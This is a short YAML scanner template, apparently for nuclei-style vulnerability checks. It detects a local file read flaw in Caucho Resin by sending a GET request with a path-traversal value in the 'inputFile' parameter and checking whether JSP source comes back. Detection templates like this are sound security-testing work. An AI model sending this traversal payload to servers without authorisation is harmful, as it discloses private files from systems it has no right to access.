id: resin-inputfile-fileread
name: Caucho Resin LFR
severity: high
confidence: tentative
description: A vulnerability in Caucho Resin allows remote unauthenticated users to utilize the 'inputFile' variable to include
  the content of locally stored files and disclose their content.
reference: https://blkstone.github.io/2017/10/30/resin-attack-vectors/
tags:
- resin
- caucho
- lfr
- vuln
requests:
- method: GET
  path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
  matchers:
  - type: status
    status:
    - 200
  - type: body
    words:
    - '%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %'
  condition: and
